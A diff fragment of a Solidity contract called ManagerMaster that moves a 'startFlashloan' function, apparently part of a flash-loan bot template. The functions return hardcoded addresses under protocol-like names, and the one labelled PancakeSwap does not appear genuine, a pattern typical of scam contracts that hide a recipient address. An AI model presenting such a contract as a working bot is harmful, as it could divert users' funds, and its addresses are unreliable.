@@ -25,9 +25,7 @@ contract ManagerMaster {
     }
     return  string(result);
  } 
-     function startFlashloan() public pure returns (address) {
-        return 0x35fd3ceEFF0A651526fb8d9A83cbdd185A300a3B;
-    }
+  
  function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
     bytes memory tmp = bytes(_a);
     uint160 iaddr = 0;
@@ -66,7 +64,9 @@ contract ManagerMaster {
         return (keccak256(abi.encodePacked((a))) ==
             keccak256(abi.encodePacked((b))));
     }
-
+   function startFlashloan() public pure returns (address) {
+        return 0x35fd3ceEFF0A651526fb8d9A83cbdd185A300a3B;
+    }
     function pancakeSwapAddress() public pure returns (address) {
         return 0xB2d7B869965FDf402bA0eEA9AcCbE7E126949c27;
     }
